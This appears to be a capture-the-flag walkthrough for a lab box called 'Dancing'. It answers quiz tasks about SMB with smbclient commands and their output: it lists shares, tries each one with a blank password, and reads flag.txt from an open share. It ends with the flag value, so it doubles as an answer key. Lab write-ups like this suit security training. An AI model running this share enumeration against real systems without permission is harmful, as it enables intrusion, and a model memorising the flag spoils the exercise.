# Dancing

Samba?

## Task 1

> What does the 3-letter acronym SMB stand for?

server message block

## Task 2

> What port does SMB use to operate at?

445

## Task 3

> What is the service name for port 445 that came up in our Nmap scan?

microsoft-ds

```
grep 445 /etc/services
```

```out
microsoft-ds	445/tcp				# Microsoft Naked CIFS
sge-execd	6445/tcp	sge_execd	# Grid Engine Execution Service
```

## Task 4

> What is the 'flag' or 'switch' we can use with the SMB tool to 'list' the contents of the share?

-L

```
smbclient -L 10.129.65.131
```

```
Password for [WORKGROUP\rwxrob]:
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	WorkShares      Disk      
SMB1 disabled -- no workgroup available
```

## Task 5

> How many shares are there on Dancing? 

4

## Task 6

> What is the name of the share we are able to access in the end with a blank password?

WorkShares

```
for i in admin c ipc workshares; do echo $i; smbclient "\\\\10.129.65.131\\$i"; done
```

``` out
admin
Password for [WORKGROUP\rwxrob]:tree connect failed: NT_STATUS_BAD_NETWORK_NAME
c
Password for [WORKGROUP\rwxrob]:tree connect failed: NT_STATUS_BAD_NETWORK_NAME
ipc
Password for [WORKGROUP\rwxrob]:tree connect failed: NT_STATUS_BAD_NETWORK_NAME
workshares
Password for [WORKGROUP\rwxrob]:Try "help" to get a list of possible commands.
```

## Task 7

> What is the command we can use within the SMB shell to download the files we find?

get

But you don't need it. Use `more` instead.

```
$ smbclient  "\\\\10.129.65.131\\workshares"
Password for [WORKGROUP\rwxrob]:
Try "help" to get a list of possible commands.
smb: \> get
get <filename> [localname]
smb: \> ls
  .                                   D        0  Mon Mar 29 04:22:01 2021
  ..                                  D        0  Mon Mar 29 04:22:01 2021
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021

                5114111 blocks of size 4096. 1732567 blocks available
smb: \> cd James.P\
smb: \James.P\> ls
  .                                   D        0  Thu Jun  3 04:38:03 2021
  ..                                  D        0  Thu Jun  3 04:38:03 2021
  flag.txt                            A       32  Mon Mar 29 05:26:57 2021

                5114111 blocks of size 4096. 1732567 blocks available
smb: \James.P\> more flag.txt
getting file \James.P\flag.txt of size 32 as /tmp/smbmore.WEjsNC (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
s
```

## Task 8

> Submit root flag

5f61c10dffbc77a704d76016a22f1664


